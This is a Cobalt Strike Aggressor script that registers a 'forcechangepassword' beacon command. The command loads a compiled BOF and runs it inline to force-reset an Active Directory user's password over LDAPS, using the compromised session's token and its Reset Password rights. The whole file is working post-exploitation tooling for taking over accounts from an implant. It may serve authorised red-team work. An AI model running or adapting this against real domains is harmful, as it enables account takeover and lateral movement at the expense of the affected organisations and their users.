# forcechangepassword.cna
# -----------------------
# Aggressor script for the forcechangepassword BOF.
#
# Usage inside Cobalt Strike:
#   forcechangepassword <username> <newpassword>
#
# Example:
#   forcechangepassword jdoe NewP@ssw0rd!
#
# Requirements:
#   - Current beacon session must have "Reset Password" ACE on the
#     target user object, OR be running as a DA / Account Operator.
#   - The target DC must have LDAPS (port 636) enabled.
#
# Author: @lineeralgebra

alias forcechangepassword {
    local('$bid $handle $data $args $username $newpassword');
    $bid = $1;

    # Validate we got both required arguments
    if (size(@_) < 3) {
        berror($bid, "Usage: forcechangepassword <username> <newpassword>");
        berror($bid, "Example: forcechangepassword jdoe NewP\@ssw0rd!");
        return;
    }

    $username    = $2;
    $newpassword = $3;

    # Read the compiled BOF
    $handle = openf(script_resource("forcechangepassword.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack both arguments as zero-terminated strings
    # BOF reads them in order: target_user first, new_password second
    $args = bof_pack($bid, "zz", $username, $newpassword);

    btask($bid, "Running forcechangepassword BOF by \@lineeralgebra");
    btask($bid, "  Target user : $username");
    btask($bid, "  Via         : LDAPS port 636 (current session token)");

    beacon_inline_execute($bid, $data, "go", $args);
}

# Register help text visible in the CS help menu
beacon_command_register(
    "forcechangepassword",
    "Force-change an AD user password via LDAPS (unicodePwd). Requires Reset Password ACE.",
    "Usage: forcechangepassword <username> <newpassword>\n\nArgs:\n  username    - sAMAccountName of the target user\n  newpassword - the new password to set\n\nExample:\n  forcechangepassword jdoe NewP\@ssw0rd!\n\nNote:\n  Uses current beacon token (Kerberos/NTLM negotiate).\n  DC must have LDAPS (port 636) enabled."
);
